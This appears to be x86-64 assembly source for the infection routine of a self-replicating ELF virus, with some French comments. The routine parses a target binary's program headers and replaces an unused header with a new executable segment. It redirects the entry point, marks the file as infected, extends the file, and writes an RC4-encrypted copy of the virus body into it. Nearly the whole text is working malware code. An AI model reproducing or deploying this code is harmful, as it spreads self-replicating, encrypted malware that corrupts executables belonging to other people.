infection:
	PUSH_ALLr
	mov	BYTE [rel ispie], 0
	mov BYTE [rel zero], 1
	mov qword [rel p_offset], 0
	mov qword [rel p_vaddr], 0
	mov qword [rel p_paddr], 0

	mov r10, [r14 + ehdr.e_phoff]
	movzx rcx, word [r14 + ehdr.e_phnum]
	movzx rdi, word [r14 + ehdr.e_phentsize]

	xor r15, r15
	xor r11, r11
	xor r8, r8
	mov r13, 1

.loop:
	push r11
	push rcx


	mov rax, r8
	mul rdi
	add rax, r10
	lea rbx, [r14 + rax]

	pop rcx
	pop r11
	inc r8
	cmp dword [rbx], 3
	jne	.no_interp
.no_interp:

	cmp dword [rbx], 2
	jne	.no_dynamic
	; FAUT PARSER CETTE MERDE DE HEADER DYNAMIC AAAAH\
	; RBX c'est l'offset
	PUSH_ALL
	;lea		rsi, [rel path]
	;call	printf

	mov		rcx, [rbx + phdr.p_filesz]
	shr		rcx, 4
	mov		rdi, r14
	add		rdi, [rbx + phdr.p_offset]
	.parsing_dyn:


	mov		eax, [rdi]
	cmp		eax, 0x6ffffffb
	jne		.next_dyn

	mov		eax, [rdi + 8]
	test	eax, 134217728
	je		.next_dyn
	mov		BYTE [rel ispie], 1


.next_dyn:
	add		rdi, 16
	loop	.parsing_dyn



	POP_ALL

.no_dynamic:


	cmp dword [rbx], 1
	jne .no_load

	mov rax, [rbx + phdr.p_filesz]
	add rax, [rbx + phdr.p_offset]
	cmp rax, [rel p_offset]
	jb .no_above
	mov [rel p_offset], rax

.no_above_offset:
	mov rax, [rbx + phdr.p_vaddr]
	add rax, [rbx + phdr.p_memsz]
	cmp rax, [rel p_vaddr]
	jb .no_above
	mov [rel p_vaddr], rax

.no_above:
	cmp dword [rbx + phdr.p_flags], 6
	jnle .no_load
	mov r15, [rbx + phdr.p_vaddr]
	sub r15, [rbx + phdr.p_offset]

.no_load:
	cmp dword [rbx], 0
	je .useless_ph
	cmp dword [rbx], 4
	je .useless_ph
	cmp dword [rbx], 5
	je .useless_ph
	jmp .not_useless_ph

.useless_ph:
	mov rax, r8
	dec rax
	mul rdi
	add rax, r10
	mov r11, rax
	xor r13, r13

.not_useless_ph:
	dec rcx
	jnz .loop


	cmp BYTE [rel dynm], 0
	je	.no_check_dynm
	cmp BYTE [rel ispie], 0
	je	.return

.no_check_dynm:
	cmp r13, 1
	je	.return

	mov rax, [rel p_vaddr]
	mov rdx, [rel p_offset]
	call align_value

	mov [rel p_vaddr], rax
	mov [rel entry], rax
	mov [rel p_paddr], rax

	lea rsi, [r14 + r11]

	push rdi
	push rcx
	mov rdi, rsi
	lea rsi, [rel new_programheader]
	mov rcx, 56
	rep movsb
	pop rcx
	pop rdi

	mov rax, [rel p_vaddr]
	mov [r14 + ehdr.e_entry], rax

	mov byte [r14 + 0xa], 1

	mov rax, [rel p_offset]
	add rax, WAR_SIZE_NO_BSS
	cmp rax, [rel file_size]
	jbe .no_extend

	mov rax, SYS_munmap
	mov rdi, r14
	mov rsi, [rel file_size]
	syscall

	mov rax, SYS_ftruncate
	mov rdi, r12
	mov rsi, [rel p_offset]
	add rsi, WAR_SIZE_NO_BSS
	mov [rel file_size], rsi
	syscall

	mov rax, SYS_mmap
	xor rdi, rdi
	mov rsi, [rel file_size]
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	mov r8, r12
	xor r9, r9
	syscall
	mov r14, rax

.no_extend:
	push rdi
	push rsi
	push rcx

	call update_signature

	mov rax, SYS_mmap
	xor rdi, rdi
	mov rsi, WAR_SIZE_NO_BSS
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_PRIVATE | MAP_ANONYMOUS
	mov r8, -1
	xor r9, r9
	syscall

	cmp rax, -4095
	jae .return
	mov rbx, rax

	mov rdi, rbx


	mov		rsi, [rbp + 8]
	;lea rsi, [rel _start]


	mov rcx, WAR_SIZE_NO_BSS
	rep movsb

	mov rdi, rbx
	mov		rax, [rbp + 24]
	;lea rax, [rel _encrypted_start]

	mov		rcx, [rbp + 8]
	;lea rcx, [rel _start]

	sub rax, rcx
	add rdi, rax

	; RC4
	mov		rdx, [rbp + 16]
	;lea rdx, [rel _stop]

	mov		rcx, [rbp + 24]
	;lea rcx, [rel _encrypted_start]
	sub rdx, rcx
	mov rsi, rdx
	xor rdx, rdx
	call		[rbp]


	mov rdi, r14
	add rdi, [rel p_offset]
	mov rsi, rbx
	mov rcx, WAR_SIZE_NO_BSS
	rep movsb

	mov rdi, rbx
	mov rsi, WAR_SIZE_NO_BSS
	mov rax, SYS_munmap
	syscall

	pop rcx
	pop rsi
	pop rdi

	mov rax, SYS_munmap
	mov rdi, r14
	mov rsi, [rel file_size]
	syscall

.return:
	mov qword [rel entry], 0
	mov qword [rel old_entry],  0
	mov	qword [rel p_offset],  0
	mov	qword [rel p_vaddr],  0
	mov	qword [rel p_paddr],  0
	mov rax, r13
	POP_ALLr
	ret
